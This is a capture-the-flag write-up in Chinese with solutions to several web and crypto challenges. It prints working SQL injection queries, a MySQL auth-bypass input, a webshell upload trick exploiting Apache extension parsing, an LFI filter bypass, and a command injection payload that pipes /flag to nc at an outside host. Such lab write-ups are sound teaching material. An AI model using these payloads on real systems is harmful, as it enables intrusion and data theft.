# BreakAll-CTF

有些misc的script隨便寫寫，解完就忘記丟哪了，所以沒放上來

如果有找到會再補上

## EasyPeasy

單純的Union Based MySQL Injection

`id = 1 and 1 = 2 union select 1, 2, 3`

`id = 1 and 1 = 2 union select 1, 2, group_concat(schema_name) from information_schema.schemata`

`id = 1 and 1 = 2 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema='fl4g'`

`id = 1 and 1 = 2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='secret'`

`id = 1 and 1 = 2 union select 1, 2, THIS_IS_FLAG_YO from fl4g.secret`


## EasyPeasy2

只是把回顯關掉

但是有True / False

所以可以用Boolean Based SQL Injection

比較意外的是這題其實可以用SQLmap，但解出來的人居然不多XD


## four-char-inj 

這題的話其實就是考MySQL的觀念

MySQL有點weak type的味道

所以`/?user='|0%23`就能過了，pass用不到

因為`'字串' | 0` 會變成0，所以整句變成`WHERE username=0`

所以假設DB中的username是`admin`，那這個條件就會成立 (類似PHP)

另外這題解答不唯一

還可以`/?user='=0%23`, `/?user='^0%23`等


## sh3ll_upload3r

這題就很單純，能上傳的內容基本上不能變，也繞不過

但他有擋副檔名，不能出現`h`

所以其實就是要考Apache解析漏洞

上傳`shell.php.abc`

再去訪問`/upload/shell.php.abc`就會跑這隻腳本惹


## youtube_viewer

這題居然沒人解XDDD

這題是某場CTF的題目改編的


因為沒有Source Code，也沒有回顯

加上題目說後端會去下載/查看youtube image

所以可以猜測可能背後是用curl或wget之類的command

(一般人很容易往XSS, SQLinj, SSRF...等方向想，但都不會想到可能是Command Injection XD)

他還提示我們多踹一些Payload，所以可以猜測應該不是常見的情境

試試常用的幾個：`&& sleep 10`, `| sleep 10`, ... 都無法

最後試: `';sleep 10;'`

OK，成功了

所以猜測他背後應該是長這樣：`system("curl 'https://youtube.com/xxxx/$myinput'")`

但沒有回顯，所以我們要把資料傳出來

可以這樣：`';cat /flag | base64 | nc ctf.kaibro.tw 5566;'`

## easy_lfi

這題會把`../`砍掉

所以只要改用`....//`，就會被取代成原本的`../`

`....//....//....//....//....//....//....//flag`

## git leak

就跟題目名字一樣

單純的git還原

就看得到FLAG惹XD


## RSA 後門 (1)

題目給了`d^2*e + 7phi`

又知`c = m^e`

所以`c^(d^2*e+7phi)%n = m^(d^2*e^2+7*phi*e)%n = m`

---

